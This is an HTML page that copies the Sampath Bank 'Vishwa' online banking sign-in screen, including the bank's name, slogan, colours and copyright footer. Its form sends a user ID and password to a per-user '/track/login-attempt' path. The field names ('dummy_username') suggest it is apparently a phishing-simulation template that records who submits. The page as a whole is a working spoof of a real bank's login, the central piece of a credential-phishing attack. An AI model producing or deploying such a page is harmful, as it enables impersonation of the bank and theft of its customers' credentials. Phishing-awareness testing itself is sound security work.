<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sampath Bank - Vishwa Online Banking</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            font-family: Arial, Helvetica, sans-serif;
        }
        body {
            min-height: 100vh;
            background:
                linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0%25" stop-color="%23666"/><stop offset="100%25" stop-color="%23444"/></linearGradient></defs><rect fill="url(%23g)" width="1920" height="1080"/><circle cx="960" cy="480" r="320" fill="%23555" opacity="0.35"/></svg>') center/cover no-repeat fixed;
            display: flex;
            flex-direction: column;
        }
        .top-bar {
            width: 100%;
            background: #f47920;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 32px;
            color: #fff;
            font-size: 22px;
            flex-shrink: 0;
        }
        .top-bar .nav-left,
        .top-bar .nav-right {
            display: flex;
            align-items: center;
            gap: 24px;
        }
        .top-bar .brand-mini {
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.02em;
        }
        .page-body {
            flex: 1;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 48px 24px 32px;
        }
        .login-panel {
            width: 100%;
            max-width: 520px;
            text-align: center;
        }
        .bank-logo {
            display: inline-flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 36px;
            background: rgba(255, 255, 255, 0.95);
            padding: 16px 24px;
            border-radius: 6px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
        }
        .bank-emblem {
            width: 64px;
            height: 64px;
            background: #f47920;
            clip-path: polygon(30% 0%, 70% 0%, 100% 30%, 100% 70%, 70% 100%, 30% 100%, 0% 70%, 0% 30%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            color: #fff;
            flex-shrink: 0;
        }
        .bank-name { text-align: left; }
        .bank-name strong {
            display: block;
            font-size: 26px;
            color: #111;
            line-height: 1.1;
        }
        .bank-name small {
            display: block;
            font-size: 10px;
            color: #555;
            letter-spacing: 0.04em;
            margin-top: 4px;
        }
        .signin-title {
            color: #f47920;
            font-size: 36px;
            font-weight: 400;
            margin-bottom: 28px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.35);
        }
        .form-card {
            background: #fff;
            border-radius: 4px;
            padding: 32px 28px 20px;
            text-align: left;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
            margin-bottom: 0;
        }
        .input-group { margin-bottom: 24px; }
        .input-group input {
            width: 100%;
            border: none;
            border-bottom: 2px solid #f47920;
            padding: 12px 4px 10px;
            font-size: 15px;
            color: #333;
            outline: none;
            letter-spacing: 0.02em;
        }
        .input-group input::placeholder {
            color: #bbb;
            text-transform: uppercase;
            font-size: 13px;
        }
        .input-group.password input { border-bottom-color: #ccc; }
        .signin-bar {
            width: 100%;
            max-width: 520px;
            background: #9e9e9e;
            padding: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            border: none;
            color: #fff;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.08em;
            cursor: pointer;
            margin-top: 0;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }
        .signin-bar:hover { background: #888; }
        .arrow-circle {
            width: 32px;
            height: 32px;
            border: 2px solid #fff;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }
        .footer-meta {
            width: 100%;
            padding: 24px;
            text-align: center;
            color: rgba(255, 255, 255, 0.9);
            font-size: 12px;
            line-height: 1.7;
            flex-shrink: 0;
        }
        form {
            width: 100%;
            max-width: 520px;
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="nav-left">
            <span>&#9776;</span>
            <span class="brand-mini">Sampath Vishwa</span>
        </div>
        <div class="nav-right">
            <span>&#128276;</span>
        </div>
    </div>

    <div class="page-body">
        <div class="login-panel">
            <div class="bank-logo">
                <div class="bank-emblem">&#9758;</div>
                <div class="bank-name">
                    <strong>Sampath Bank</strong>
                    <small>WE OPEN UP A WORLD OF POSSIBILITIES</small>
                </div>
            </div>
            <h2 class="signin-title">Sign in</h2>

            <form action="/track/login-attempt/{{ user_id }}" method="POST">
                <div class="form-card">
                    <div class="input-group">
                        <input type="text" name="dummy_username" placeholder="VISHWA ID" required>
                    </div>
                    <div class="input-group password">
                        <input type="password" name="dummy_password" placeholder="PASSWORD" required>
                    </div>
                </div>
                <button type="submit" class="signin-bar">
                    <span class="arrow-circle">&#8594;</span>
                    SIGN IN
                </button>
            </form>
        </div>
    </div>

    <div class="footer-meta">
        Ver 1.2.44<br>
        &copy; 2018 Sampath Bank PLC<br>
        Solution by Bhasha Lanka (Pvt) Ltd.
    </div>
</body>
</html>
